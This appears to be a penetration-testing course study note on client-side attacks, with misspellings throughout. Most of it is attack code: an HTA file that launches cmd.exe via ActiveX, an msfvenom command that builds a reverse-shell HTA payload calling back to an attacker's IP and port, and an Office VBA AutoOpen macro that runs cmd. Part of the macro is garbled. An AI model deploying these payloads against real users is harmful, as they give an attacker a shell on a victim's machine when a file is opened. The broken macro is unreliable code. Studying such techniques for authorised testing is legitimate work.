# Module 13 (Clint Side Attacks)

<figure><img src="../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

Know Your Target

*   Passive Client Information Gathering

    * identifying the victim's browser


* Active Client Information Gathering
  * Social Engineering and Client-Side Attacks



Leveraging HTM: Application

* Exploring HTML Applications
* HTA Attacks in Action

```html
<!DOCTYPE html>
<html>
<head>
	<script>
	var x='cmd.exe'
	new ActiveXObject('WScript.shell').Run(x);
</script>
</head>
<body>
<script>
	self.close();
</script>
</body>
</html>
```

Cerete payloa to make revers shell&#x20;

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.8 LPORT=4444   -f hta-psh -o /var/www/html/evil.hta

```

<figure><img src="../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

Exploiting Microsoft Office

* installing Microsoft
* &#x20;

```
Sub AutoOpen()
test1
End Sub
Sub Doo_Open(0
test1
End Sub
Sub test1()
Createobject("WScript.shell").Run "cmd"
End Sub
```
